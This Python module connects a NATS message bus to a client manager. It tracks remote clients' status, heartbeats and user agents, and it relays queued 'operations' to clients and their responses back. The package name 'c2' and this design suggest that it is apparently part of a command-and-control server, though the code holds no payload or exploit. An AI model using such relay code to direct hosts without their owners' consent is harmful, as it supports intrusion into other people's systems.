import nats
import asyncio
import json
import time

from typing import Optional

from nats.js import JetStreamContext
from nats.js.kv import KeyValue
from nats.js.errors import NotFoundError

from c2.clients.base import client_manager, ClientRunMessage

async def put_client_info(bucket:KeyValue, id:str, status:str, last_seen:float, user_agent:Optional[str]):
    await bucket.put(id, json.dumps({
        "status": status,
        "last_seen": last_seen,
        "user_agent": user_agent,
    }).encode())

async def get_or_create_bucket(js:JetStreamContext, bucket_name: str):
    try:
        # Try to access existing bucket
        kv = await js.key_value(bucket_name)
        print(f"Bucket '{bucket_name}' already exists.")
        return kv

    except NotFoundError:
        # Create if it doesn't exist
        print(f"Bucket '{bucket_name}' not found. Creating...")
        kv = await js.create_key_value(
            bucket=bucket_name,
            history=5,
            ttl=None,
        )
        return kv

async def run_nats():
    nc = None
    sub = None
    try:
        nc = await nats.connect("nats://nats:4222")
        js = nc.jetstream()

        clients_bucket = await get_or_create_bucket(js, 'clients')

        async def handle_message(id:str, msg:ClientRunMessage):
            print(f"Publishing message client.response.{id}.{msg.id} with operation {msg.operation} and data {msg.data}")
            await nc.publish(f'client.response.{id}.{msg.id}', msg.model_dump_json().encode())

        client_manager.on_msg(handle_message)

        async def handle_connect(id:str, user_agent:Optional[str] = None):
            await nc.publish('client.connect', id.encode())
            await put_client_info(clients_bucket, id, "connected", time.time(), user_agent)

        client_manager.on_connect(handle_connect)

        async def handle_disconnect(id:str, last_seen:float, user_agent:Optional[str]):
            await nc.publish('client.disconnect', id.encode())
            await put_client_info(clients_bucket, id, "disconnected", last_seen, user_agent)

        client_manager.on_disconnect(handle_disconnect)

        async def handle_heartbeat(id:str, last_seen:float, user_agent:Optional[str]):
            await put_client_info(clients_bucket, id, "connected", last_seen, user_agent)

        client_manager.on_heartbeat(handle_heartbeat)

        sub = await nc.subscribe("client.operations.*")

        async for msg in sub.messages:
            print(f"Received message on subject {msg.subject}: {msg.data}")
            id = msg.subject.removeprefix("client.operations.")
            try:
                parsed_msg = ClientRunMessage.model_validate_json(msg.data)
            except Exception as e:
                print(f"Failed to parse message for client {id} with error {e}")
                continue

            try:
                await client_manager.enqueue_message(id, parsed_msg)
            except Exception as e:
                # A single client's stale/reconnecting websocket must not kill
                # this consumer for every other client.
                print(f"Failed to enqueue message for client {id} with error {e}")
    except asyncio.CancelledError:
        if sub:
            await sub.unsubscribe()
        if nc:
            await nc.drain()


async def run_nats_supervised():
    """Restarts run_nats() if it ever dies from an unhandled exception,
    instead of silently leaving the NATS bridge dead for the process's
    lifetime. run_nats() only returns normally when cancelled (shutdown)."""
    while True:
        try:
            await run_nats()
            return
        except Exception as e:
            print(f"run_nats() crashed, restarting in 2s: {e}")
            await asyncio.sleep(2)


if __name__ == '__main__':
    import asyncio
    asyncio.run(run_nats())